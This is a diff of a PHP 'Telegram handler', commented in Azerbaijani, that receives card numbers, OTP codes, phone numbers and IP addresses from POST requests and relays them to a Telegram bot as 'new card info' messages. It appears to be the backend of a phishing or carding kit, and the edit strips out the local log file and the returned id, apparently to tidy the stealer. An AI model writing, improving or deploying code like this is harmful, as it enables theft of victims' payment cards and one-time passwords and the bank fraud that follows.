@@ -1,4 +1,8 @@
 <?php
+// ============================================================
+// TELEGRAM HANDLER - TAM İŞLƏYƏN VERSİYA
+// ============================================================
+
 // YALNIZ POST İCƏZƏLİDİR
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(403);
@@ -48,11 +52,8 @@ function sendToTelegram($message) {
     return $httpCode;
 }
 
-// ============================================================
-// 🔥 1. KART MESAJI (ORİJİNAL 720 SƏTİRLİK KODDAKİ KİMİ)
-// ============================================================
+// 1. KART MESAJI
 if ($type === 'card_only' && !empty($cardNumber)) {
-    // IP-ni yoxla
     $userIP = !empty($ip) ? $ip : 'N/A';
     
     $message = "💳 **YENİ KART BİLGİSİ** 💳\n\n";
@@ -67,17 +68,12 @@ if ($type === 'card_only' && !empty($cardNumber)) {
     
     sendToTelegram($message);
     
-    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | NÖMRƏ: $phone | IP: $ip\n";
-    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
-    
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'id' => $id]);
+    echo json_encode(['status' => 'success']);
     exit;
 }
 
-// ============================================================
-// 🔥 2. OTP MESAJI (ORİJİNAL 720 SƏTİRLİK KODDAKİ KİMİ)
-// ============================================================
+// 2. OTP MESAJI
 if (!empty($otp)) {
     $userIP = !empty($ip) ? $ip : 'N/A';
     
@@ -91,11 +87,8 @@ if (!empty($otp)) {
     
     sendToTelegram($message);
     
-    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | NÖMRƏ: $phone | IP: $ip\n";
-    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
-    
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'id' => $id]);
+    echo json_encode(['status' => 'success']);
     exit;
 }
 
